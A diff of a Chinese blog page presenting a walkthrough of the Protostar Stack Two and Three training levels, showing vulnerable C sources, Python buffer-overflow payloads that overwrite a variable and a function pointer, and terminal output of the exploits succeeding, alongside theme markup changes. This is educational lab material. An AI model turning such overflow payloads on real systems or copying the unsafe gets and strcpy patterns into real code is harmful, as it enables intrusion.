-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;GREENIE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;you have correctly modified the variable</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
 <p>主要是设置环境变量的问题</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ more stack2.py
-</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">64</span>
-</span></span><span style="display:flex;"><span>modified <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\x0a\x0d\x0a\x0d&#34;</span>
-</span></span><span style="display:flex;"><span>print <span style="color:#f92672">(</span>padding + modified<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ python stack2.py &gt; st2
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ export GREENIE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>cat st2<span style="color:#66d9ef">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ echo $GREENIE
-</span></span><span style="display:flex;"><span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ /opt/protostar/bin/stack2
-</span></span><span style="display:flex;"><span>you have correctly modified the variable
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ 
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ more stack2.py
+</span></span><span class="line"><span class="cl"><span class="nv">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> * <span class="m">64</span>
+</span></span><span class="line"><span class="cl"><span class="nv">modified</span> <span class="o">=</span> <span class="s2">&#34;\x0a\x0d\x0a\x0d&#34;</span>
+</span></span><span class="line"><span class="cl">print <span class="o">(</span>padding + modified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ python stack2.py &gt; st2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ <span class="nb">export</span> <span class="nv">GREENIE</span><span class="o">=</span><span class="k">$(</span>cat st2<span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ <span class="nb">echo</span> <span class="nv">$GREENIE</span>
+</span></span><span class="line"><span class="cl"> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ /opt/protostar/bin/stack2
+</span></span><span class="line"><span class="cl">you have correctly modified the variable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ 
+</span></span></code></pre></div><hr>
 <h2 id="stack-three">Stack Three</h2>
 <blockquote>
 <p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p>
@@ -263,31 +431,31 @@ This level is at /opt/protostar/bin/stack0
 </ul>
 <p>This level is at /opt/protostar/bin/stack3</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;code flow successfully changed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>fp)();
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  fp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  gets(buffer);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(fp) {
-</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;calling function pointer, jumping to 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fp);
-</span></span><span style="display:flex;"><span>      fp();
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><hr />
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;code flow successfully changed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">fp</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
 <p>重点是找到 <code>void win()</code> 在哪</p>
 <p>可以使用 <code>objdump -t</code></p>
 <blockquote>
@@ -295,19 +463,19 @@ This level is at /opt/protostar/bin/stack0
 <p>&ndash;syms</p>
 <p>​	Print the symbol table entries of the file. This is similar to the information provided by the nm program, although the display format is different.</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ objdump -t /opt/protostar/bin/stack3 | grep win
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08048424</span> g     F .text	<span style="color:#ae81ff">00000014</span>              win
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ objdump -t /opt/protostar/bin/stack3 <span class="p">|</span> grep win
+</span></span><span class="line"><span class="cl"><span class="m">08048424</span> g     F .text	<span class="m">00000014</span>              win
 </span></span></code></pre></div><p>可见是 <code>0x08048424</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:/tmp$ more stack3.py 
-</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">64</span>
-</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\x24\x84\x04\x08&#34;</span>
-</span></span><span style="display:flex;"><span>print <span style="color:#f92672">(</span>padding + win<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$ python stack3.py | /opt/protostar/bin/stack3
-</span></span><span style="display:flex;"><span>calling <span style="color:#66d9ef">function</span> pointer, jumping to 0x08048424
-</span></span><span style="display:flex;"><span>code flow successfully changed
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>user@protostar:/tmp$
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp$ more stack3.py 
+</span></span><span class="line"><span class="cl"><span class="nv">padding</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> * <span class="m">64</span>
+</span></span><span class="line"><span class="cl"><span class="nv">win</span> <span class="o">=</span> <span class="s2">&#34;\x24\x84\x04\x08&#34;</span>
+</span></span><span class="line"><span class="cl">print <span class="o">(</span>padding + win<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$ python stack3.py <span class="p">|</span> /opt/protostar/bin/stack3
+</span></span><span class="line"><span class="cl">calling <span class="k">function</span> pointer, jumping to 0x08048424
+</span></span><span class="line"><span class="cl">code flow successfully changed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@protostar:/tmp$
 </span></span></code></pre></div>
 </section>
 
@@ -316,6 +484,7 @@ This level is at /opt/protostar/bin/stack0
     
 
     </footer>
+
 
     
 </article>
@@ -409,58 +578,16 @@ This level is at /opt/protostar/bin/stack0
     }
 </style>
 
-    <aside class="related-contents--wrapper">
     
+
     
-        <h2 class="section-title">这些大概是相关内容</h2>
-        <div class="related-contents">
-            <div class="flex article-list--tile">
-                
-                    
-<article class="has-image">
-    <a href="/p/protostar_format_1/">
-        
-        
-            <div class="article-image">
-                <img src="/p/protostar_format_1/cover.ba3a9c328ba053608cd6622047533696_hu3269c14bc612de0181d0832790962363_1868749_250x150_fill_box_smart1_3.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy" 
-                        data-key="protostar_format_1" 
-                        data-hash="md5-ujqcMougU2CM1mIgR1M2lg==">
-                
-            </div>
-        
 
-        <div class="article-details">
-            <h2 class="article-title">格式，魔法，红宝石</h2>
-        </div>
-    </a>
-</article>
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
                 
-                    
-<article class="has-image">
-    <a href="/p/protostar_format_0-4/">
-        
-        
-            <div class="article-image">
-                <img src="/p/protostar_format_0-4/cover.151cc4bdd51852f38533dab3b7c65c1c_hu26b9c4d780e35c305fc3142cfdfe9749_924530_250x150_fill_box_smart1_3.png" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy" 
-                        data-key="protostar_format_0-4" 
-                        data-hash="md5-FRzEvdUYUvOFM9qzt8ZcHA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Protostar Format 0-4 Walkthrough</h2>
-        </div>
-    </a>
-</article>
-                
-                    
 <article class="has-image">
     <a href="/p/protostar_stack_4-7/">
         
@@ -469,7 +596,8 @@ This level is at /opt/protostar/bin/stack0
                 <img src="/p/protostar_stack_4-7/cover.cfd920525b2d933021345b98658bc9b7_hu89b69cad7273891b1af867ec9c4a2eb7_439381_250x150_fill_box_smart1_3.png" 
                         width="250" 
                         height="150" 
-                        loading="lazy" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Stack 0-7 Walkthrough"
                         data-key="protostar_stack_4-7" 
                         data-hash="md5-z9kgUlstkzAhNFuYZYvJtw==">
                 
@@ -481,30 +609,75 @@ This level is at /opt/protostar/bin/stack0
         </div>
     </a>
 </article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_format_1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/protostar_format_1/cover.3055e76320895d583e5eb8b5b47454de_hu496a20f2b4777c05e734bfc6b70c220b_1249701_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 格式，参数，红宝石"
+                        data-key="protostar_format_1" 
+                        data-hash="md5-MFXnYyCJXVg&#43;Xri1tHRU3g==">
                 
             </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">格式，参数，红宝石</h2>
         </div>
-    
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_format_0-4/">
+        
+        
+            <div class="article-image">
+                <img src="/p/protostar_format_0-4/cover.151cc4bdd51852f38533dab3b7c65c1c_hu26b9c4d780e35c305fc3142cfdfe9749_924530_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Format 0-4 Walkthrough"
+                        data-key="protostar_format_0-4" 
+                        data-hash="md5-FRzEvdUYUvOFM9qzt8ZcHA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Protostar Format 0-4 Walkthrough</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
 </aside>
 
      
-     
+    
         
     
 
     <footer class="site-footer">
     
-
-    <section class="copyright">
-        Since: 2021.7｜By: Kurusu Senri
-    </section>
-    <section class="powerby">
-        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        <span id="busuanzi_container_site_pv">共<span id="busuanzi_value_site_pv"></span>次访问<br>是说这里确实非常安静ww</span><br>
-        框架：Hugo｜主题修改自：Stack
-    </section>
     
+    <section class="powerby">
+        
+
+        <span>Senri Nya~ | Since July 2021<br></span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> visits<br></span>Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
 </footer>
+
 
     
 <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
@@ -570,11 +743,11 @@ This level is at /opt/protostar/bin/stack0
 
 </div><script 
                 src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
+                defer
                 >
             </script><script 
                 src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
+                defer
                 >
             </script><link 
                 rel="stylesheet" 
@@ -585,11 +758,13 @@ This level is at /opt/protostar/bin/stack0
             >
 
             </main>
-    
-        <aside class="sidebar right-sidebar sticky">
-            <section class="widget archives">
-                <div class="widget-icon">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <line x1="5" y1="9" x2="19" y2="9" />
   <line x1="5" y1="15" x2="19" y2="15" />
@@ -599,28 +774,31 @@ This level is at /opt/protostar/bin/stack0
 
 
 
-                </div>
-                <h2 class="widget-title section-title">目录</h2>
-                
-                <div class="widget--toc">
-                    <nav id="TableOfContents">
-  <ul>
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
     <li><a href="#stack-four--six">Stack Four ~ Six</a></li>
     <li><a href="#stack-zero">Stack Zero</a></li>
     <li><a href="#stack-one">Stack One</a></li>
     <li><a href="#stack-two">Stack Two</a></li>
     <li><a href="#stack-three">Stack Three</a></li>
-  </ul>
+  </ol>
 </nav>
-                </div>
-            </section>
-        </aside>
-    
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
         </div>
         <script 
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
+                
                 >
             </script><script type="text/javascript" src="/ts/main.js" defer></script>
 <script>
@@ -635,19 +813,7 @@ This level is at /opt/protostar/bin/stack0
     }());
 </script>
 
-<script>
-    var normalTitle = document.title;
-    
-    window.onfocus = function () {
-        document.title = "(*/ω＼*)";
-        setTimeout(function () {
-            document.title = normalTitle;
-        }, 1500);
-    };
-    window.onblur = function () {
-        document.title = 'ﾍ(･_|探头..';
-    };
-</script>
+
 
 
 
